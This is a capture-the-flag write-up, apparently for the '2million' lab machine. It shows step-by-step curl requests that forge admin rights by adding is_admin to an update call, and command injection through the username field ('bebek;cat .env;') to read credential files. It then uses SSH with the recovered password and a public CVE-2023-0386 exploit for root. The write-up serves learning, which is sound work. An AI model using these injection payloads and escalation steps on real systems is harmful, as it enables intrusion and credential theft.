1. Run Nmap to check which port is opened from the website.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/d5cbb2aa-38e0-4af7-8984-4413cf68d9bf)

2. Add Vhost to /etc/hosts with named 2million.htb so we are able to see the website's content. <br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/110fad6d-4deb-4a48-8a2c-3484d0c33d8b)

Website's content:

![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/f3704c2e-dd5d-4877-a520-b9a2a5abfa34)

3. After analyze all of the feature, inside join feature, we can input the special code before making an account.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/dbfc4540-c514-49aa-93e7-e68e5c52ff7d)
Content:
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/d9f91921-7365-46d2-9791-8c88b0fd8daa)

4. Let's check the source code and we found that the feature directed to /js/inviteapi.min.js.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/1c4cf80b-7929-485e-82cc-95a6ed2419ac)

5. When we opened the file, it seems that the code is obfuscated.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/5f6cd5ca-91d4-445b-b8dd-a22b675f7523)

6. We can deofuscated with this amazing [tool](https://lelinhtinh.github.io/de4js/).
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/d8f516fd-d268-4124-a63c-59ffbc720382)

7. As we can see that the code is sent to 2million.htb/api/v1/invite/how/to/generate. to see what the codes inside there, we can run `curl -X POST 2million.htb/api/v1/invite/how/to/generate` where -X is to run the method.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/db3d2922-a9b8-41de-91f4-326c2be02795)

8. We know that the message encoded using ROT 13, so we can decode with this [website](https://www.dcode.fr/rot-13-cipher).
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/02fdb811-606a-4c41-a02b-39bc97912db2)

9. The message says that we have to send request to 2million.htb/api/v1/invite/generate. We can use `curl -X POST 2million.htb/api/v1/invite/generate`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/591a8d29-5f96-4b10-ae05-6927b31b5449)

10. Seems like it's base64 encoded message, so we decoded and YES! we get our special code and directed to Register page!.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/b2dde4fc-09dd-4aeb-bc35-5c75ebb12937)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/d1cc855f-6d5e-4f98-8149-d691b34df086)

Register Page:
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/574385f4-cad7-46ac-9554-a56c150fdbd4)

11. Just give a random data and for my case, I inserted my username with bebek, email bebek@2million.htb, dan password bebekgoreng.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/f485295f-697d-456d-abd8-6c0bb66c82f4)

12. Do login with our credentials before and we can see the homepage like this.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/90ce1d70-4b73-411a-ae0d-e89a95abc83a)

Homepage:
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/6c43c3e0-b099-4deb-bdeb-261afda86e11)

13. Again, checking one by one feature and found something interesting inside access feature. In this feature, we can download our own VPN Certificate (OpenVPN).
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/41da80d3-599c-4d39-8ac9-49d150bb20a3)

14. Let's check the source code and we can know that the certificate is generated from `/api/v1/users/vpn/generate`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/fdd85678-e5e5-429a-9019-2e88eac050ab)

15. When we opened the endpoint, we can only see the certificate content from the user so we can't get any crucial information there.Therefore, we are going to check the API itself with `curl -v 2million.htb/api`. <br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/e8853488-b674-4880-a479-557dca6474d4)

16. Copy the website's cookie and check the API endpoint using this command `curl -v 2million.htb/api --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/573d1561-8889-4e72-bd03-fc38df8fbf57)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/f118b90c-afa3-4ed8-8867-f17c8ea783dc)

17.Next let's check the api version endpoint with command `curl -v 2million.htb/api/v1 --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/c27a4de1-80bd-4f15-a077-9da17910730d)

18. There are several endpoints and all are related to admin. Since we are not admin yet, the feature that become the main focus is update. Checking the feature can be done by executing this command `curl -v -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/2a38922b-02a7-482f-a20d-a8d077185ba8)

19. The message shows that we have to input some data. In this case, we input our email and password like this `curl -v -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"email":"bebek@2million.htb", "password": "bebekgoreng"}'`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/e2111d10-06b3-4b9c-9927-a5187677237a)

20. Now the message shows that is_admin is not in there so, we can set *is_admin value to true or is_admin = 1* with this command `curl -v -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"email":"bebek@2million.htb", "password": "bebekgoreng", "is_admin": 1}'`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/d2f1af83-f9f1-41b6-a67c-3fccae8895e7)

21. To check if my account is admin or not, we can use the auth feature with this command `curl -v 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/6387d76a-4b71-491c-b88a-9aad80896fe8)

22. YES! We get the admin privilege, now we can check admin's VPN certificate. Command: `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json"`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/746f51c9-cbdc-4572-9d25-62a95415f928)

23. The message now shows that there is missing parameter named username so we can input our username inside our payload. Command: `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek"}'`.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/56ffc94a-1f69-4401-8be9-fd0c29304440)

24. Okay, now the website generated the user's VPN certificate to us. How about next? Well, we now analyze if this configuration using exec() or system() in php. If yes then it becomes the vulnerability of this website. To prove it, we can insert linux command such as id, ls, cat, etc. between the data input like this `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek;ls;"}'.`<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/69008932-dae0-4e00-9eab-f3ebad6da061)

25. It works! Now we can add -a to see all hidden files inside. Command: `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek;ls -a;"}'.`<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/9f2f6309-16f2-48a9-8b26-2a266043576e)

26. Env file is always the main thing to get some crucial credentials. To open it we can use cat command. `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek;cat .env;"}'.`<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/909214c7-c6e6-47a5-a21f-5e9d8a1d9949)

27. From there we know the admin and the password. We can use ssh to use admin's terminal. `ssh admin@2million.htb`. Right after login, we get the user flag!<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/031211c1-8ebb-40bd-9211-1a9934f11bc0)

28. Now we want to find the root flag. Unfortunately, we can't get the su privilege directly.<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/f7a74c31-64dc-468f-a736-22fc255548cb)

29. Checking one by one directory inside the terminal and found some interesting message inside mail folder.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/05d110da-777d-4bab-aca0-04552967dddf)

30. The message says that there is CVE that related to OverlayFS and when we search in Google, we found that this is [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) with this [payload](https://github.com/sxlmnwb/CVE-2023-0386).

31. Run git clone https://github.com/sxlmnwb/CVE-2023-0386 inside our local terminal and zip the folder then copy the zip to the admin terminal with command scp payload.zip admin@2million.htb:/home/admin.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/75090bbc-c5b2-4abc-813e-28468d83a47d)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/e8e28819-7fcc-4799-89b8-5339feebeba7)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/9f830dc0-ef57-4b5b-841f-4604123b21d2)

Result in admin terminal:<br>
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/bfaf6261-3f31-4782-bef9-281a7da16ee7)

32. Unzip the file and execute the payload which is already listed in the github.
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/229f5781-0e23-4767-b978-1e397599d728)
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/a0876400-9111-407c-9261-4105439c0b91)

33. Let's go! we get the root privilege and got the flag from root directory!
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/31368080-a473-4069-9e9a-30d71bd897fa)
